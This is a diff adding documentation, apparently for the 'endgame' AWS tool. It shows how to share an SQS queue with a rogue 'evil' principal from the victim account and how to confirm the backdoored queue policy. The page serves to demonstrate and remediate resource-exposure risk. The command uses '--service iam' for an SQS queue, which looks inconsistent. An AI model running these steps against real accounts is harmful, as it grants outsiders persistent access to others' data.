@@ -2,9 +2,43 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service iam --name test-resource-exposure
+```
+
+* To verify that the SQS queue has been shared with a rogue user, run the following from the victim account:
+
+```bash
+export QUEUE_URL=(`aws sqs get-queue-url --queue-name test-resource-exposure | jq -r '.QueueUrl'`)
+
+aws sqs get-queue-attributes --queue-url $QUEUE_URL --attribute-names Policy
+```
+
+* Observe that the contents match the example shown below.
+
 ## Example
 
+The policy below allows the Evil Principal's account ID (`999988887777` access to `sqs:*` to the victim resource (`arn:aws:sqs:us-east-1:111122223333:test-resource-exposure`), indicating a successful compromise.
+
+
+```json
+{
+    "Attributes": {
+        "Policy": "{\"Version\":\"2008-10-17\",\"Id\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure/SQSDefaultPolicy\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"SQS:*\",\"Resource\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":\"SQS:*\",\"Resource\":\"arn:aws:sqs:us-east-1:111122223333:test-resource-exposure\"}]}"
+    }
+}
+
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
@@ -22,4 +56,5 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 
 ## References
 
-* [add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sqs/add-permission.html)
+* [aws sqs add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sqs/add-permission.html)
+* [aws sqs get-queue-attributes](https://docs.aws.amazon.com/cli/latest/reference/sqs/get-queue-attributes.html)
